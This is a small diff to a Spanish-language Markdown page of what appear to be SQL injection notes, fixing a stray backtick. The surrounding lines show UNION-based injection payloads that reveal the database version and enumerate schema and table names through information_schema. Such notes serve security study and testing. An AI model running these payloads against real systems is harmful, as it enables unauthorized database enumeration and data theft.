@@ -77,7 +77,7 @@ description: Extrayendo información despues de obtener acceso a la base de dato
 
 &#x20;**`' UNION SELECT @@version,2 -- -`** → muestra la version donde deberia estar el valor de 1.
 
-&#x20;``` `**`' UNION SELECT table_schema,2 FROM information_schema.schemata -- -`** → muestra los nombres de las bases de datos.
+&#x20;**`' UNION SELECT table_schema,2 FROM information_schema.schemata -- -`** → muestra los nombres de las bases de datos.
 
 &#x20;**`' UNION SELECT table_schema,table_name FROM information_schema.tables -- -`** → muestra el nombre de las tablas y a que Base de datos pertenece.
 
